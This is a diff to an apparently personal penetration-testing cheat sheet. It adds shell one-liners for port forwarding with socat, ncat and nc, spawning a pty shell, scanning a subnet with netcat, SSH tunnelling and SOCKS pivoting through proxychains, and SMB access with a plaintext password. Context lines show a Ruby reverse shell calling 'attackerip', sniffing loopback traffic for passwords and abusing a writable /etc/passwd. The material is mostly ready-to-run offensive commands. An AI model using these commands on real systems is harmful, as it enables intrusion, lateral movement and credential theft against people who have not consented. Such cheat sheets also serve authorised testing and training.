@@ -18,6 +18,27 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.
 
 On listening host: nc -lvnp 1234
 
+#Create a forwarder listening on port 1234 forwarding to 10.0.20.1:4321
+socat -ddd TCP-LISTEN:1234,fork TCP:10.0.20.1:4321
+ncat -l localhost 1234 --sh-exec "ncat 10.0.20.1 4321"
+nc -l -p 1234 -c "nc 10.0.20.1 4321"
+
+#Spawn a TTY with python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#Test for open TCP port in IP range with netcat, timeout 1s
+for i in {0..255}; do nc -zv -w 1 10.0.20.$i 8080; done
+
+#SSH local port forwarding, listening on all interfaces on on host's port 4455, forwarding through SSH tunnel between current host and 10.0.20.1 to 10.10.10.1 port 5544
+#Meaning: outside<--->host:4455<->host<---SSH TUNNEL--->10.0.20.1<--->10.10.10.1:5544, N makes sure not to open a shell and L means local forwarding, no output after password
+ssh -N -L 0.0.0.0:4455:10.10.10.1:5544 r00t@10.0.20.1
+
+#SSH dynamic port forwarding, listening on hosts all interfaces for connections to port 3456, then forwarding traffic through a tunnel between the host an 10.0.20.1 to any destination port
+#Meaning outside<--->host:3456<->host<---SSH TUNNEL--->10.0.20.1<--->any host and port on this side, this is SOCKS, so might need for example proxychains to force traffic as SOCSK
+ssh -N -D 0.0.0.0:3456 r00t@10.0.20.1
+#To use proxychains you'd need to add "socks5 192.168.50.63 3456" to /etc/proxychains4.conf, then just normally connect preceeding with proxychains command: proxychains smbclient -L //10.0.30.1/ -U admin --password=r00t
+#You can also run nmap over this tunnel with proxychains
+
 ----
 
 #Version info
@@ -26,6 +47,10 @@ cat /etc/os-release
 uname -a
 uname -r
 arch
+
+#Network connections
+netstat -tulpn
+ss -tulpn
 
 #Users and in some case passwords can be found in /etc/passwd, which can be exploited if for some reason you have writes to this file
 #/etc/passwd passwords precede /etc/shadow ones
@@ -87,6 +112,9 @@ sudo tcpdump -i lo  -A | grep "password"
 
 #Check app-armor status (requires root)
 aa-status
+
+#Connect SMB, once if succesfully connected you can "get", "ls" etc. commands
+smbclient -p 445 -L //10.10.10.1/ -U admin --password=r00t
 
 #Too lazy to enumerate manually, try unix-privesc-check
 https://github.com/pentestmonkey/unix-privesc-check
